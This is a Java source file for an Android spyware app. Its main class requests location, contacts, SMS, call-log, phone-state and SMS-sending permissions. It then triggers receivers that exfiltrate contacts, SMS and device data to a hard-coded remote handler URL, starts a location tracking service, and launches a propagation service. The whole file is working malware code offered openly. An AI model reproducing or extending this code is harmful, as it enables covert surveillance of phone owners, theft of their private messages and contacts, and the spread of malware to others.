package android.spyware;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.spyware.receivers.ExfiltrateContactR;
import android.spyware.receivers.ExfiltrateSMSR;
import android.spyware.receivers.ExfiltrateZombieR;
import android.spyware.services.PropagateS;
import android.spyware.services.TrackerS;
import android.spyware.utils.Harvester;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class Spyware {
    public static final boolean DEV_MODE  = true;
    public static final String  PROPAGATE = "<PROPAGATE>";
    public static final String  RHOST     = "http://basmati.ambersail.net/handler.php";
    public static final String  TAG       = "::trace";
    public static final int     TIMER     = 30;
    private Context context;

    public Spyware(Context context) {
        this.context = context;
    }

    private boolean hasPermissions(String[] permissions) {
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(context, permission) != 0) {
                return false;
            }
        }

        return true;
    }

    public void run() {
        String[] permissions = {
                "android.permission.ACCESS_COARSE_LOCATION",
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.GET_ACCOUNTS",
                "android.permission.READ_CALL_LOG",
                "android.permission.READ_CONTACTS",
                "android.permission.READ_PHONE_STATE",
                "android.permission.READ_SMS",
                "android.permission.SEND_SMS"
        };

        if (!hasPermissions(permissions)) {
            int PERMISSIONS = 0;
            ActivityCompat.requestPermissions((Activity) context, permissions, PERMISSIONS);
        } else {
            Harvester harvester = new Harvester(context);

            if (harvester.isNetworkConnected()) {
                context.sendBroadcast(new Intent(context, ExfiltrateZombieR.class));
                context.sendBroadcast(new Intent(context, ExfiltrateContactR.class));
                context.sendBroadcast(new Intent(context, ExfiltrateSMSR.class));
                context.startService(new Intent(context, TrackerS.class));
            } else {
                if (DEV_MODE) {
                    Log.wtf(TAG, Spyware.class.getName() + "->run:no network connectivity");
                }
            }

            context.startService(new Intent(context, PropagateS.class));
        }
    }
}
